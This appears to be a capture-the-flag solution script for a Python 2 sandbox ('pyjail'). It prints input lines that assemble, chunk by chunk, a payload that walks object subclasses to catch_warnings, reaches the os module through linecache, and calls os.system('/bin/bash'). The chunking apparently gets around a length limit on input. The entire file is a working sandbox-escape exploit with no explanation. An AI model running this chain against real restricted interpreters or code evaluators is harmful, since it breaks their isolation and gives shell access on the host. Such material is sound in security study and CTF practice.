#!/usr/bin/python


def split_code(code):
	s = '__builtins__[0].append("'
	n = len(s) + 2
	i = 0
	j = 35 - n
	while j < len(code):
		if code[i:j][-1] == '\\':
			print(s + code[i:j-1] + '")')
			split_code('\\' + code[j:])
			return
		print(s + code[i:j] + '")')
		buf = j
		j += (j-i)
		i = buf
	print(s + code[i:j] + '")')


print("__builtins__[0]=[]")
code = "[x for x in ().__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0].__repr__.im_func.__globals__['linecache'].os.system('/bin/bash')"
split_code(code)
print('1;exec \'\'.join(__builtins__[0])')

